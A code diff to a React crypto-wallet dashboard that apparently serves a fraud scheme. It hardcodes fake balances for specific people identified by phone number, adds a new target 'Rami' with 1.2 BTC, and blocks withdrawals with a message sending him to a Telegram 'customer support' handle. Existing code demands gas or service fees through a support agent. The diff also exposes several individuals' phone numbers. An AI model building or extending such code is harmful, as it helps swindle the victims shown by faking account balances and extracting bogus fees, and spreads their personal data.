@@ -44,9 +44,10 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   const isJan = userData.phone === "447703277077";
   const isJeremy = userData.phone === "00447817963523";
   const isBen = userData.phone === "00447949987710";
+  const isRami = userData.phone === "0061414065306";
   
-  const cryptoBalance = isJoanne ? 460.101359 : isJan ? 5.813 : isJeremy ? 0 : isBen ? 0.01609472 : 44.62;
-  const cryptoSymbol = isJan ? "ETH" : isJeremy ? "ETH" : isBen ? "ETH" : "BTC";
+  const cryptoBalance = isJoanne ? 460.101359 : isJan ? 5.813 : isJeremy ? 0 : isBen ? 0.01609472 : isRami ? 1.2 : 44.62;
+  const cryptoSymbol = isJan ? "ETH" : isJeremy ? "ETH" : isBen ? "ETH" : isRami ? "BTC" : "BTC";
   const currentPrice = (isJan || isJeremy || isBen) ? ethPrice : btcPrice;
   const minWithdrawal = isJoanne ? 460.10 : isJan ? 0.1 : isJeremy ? 0.1 : isBen ? 0.1 : 45;
   
@@ -257,6 +258,14 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
       toast({
         title: "Please top up Ethereum for gas fees",
         description: "Contact your support agent for the service fee",
+        variant: "destructive",
+      });
+      setIsSendDialogOpen(false);
+    } else if (isRami) {
+      // For Rami, show customer support message with Telegram link
+      toast({
+        title: "Contact customer support to activate your wallet",
+        description: "@fatima_commercial on Telegram",
         variant: "destructive",
       });
       setIsSendDialogOpen(false);
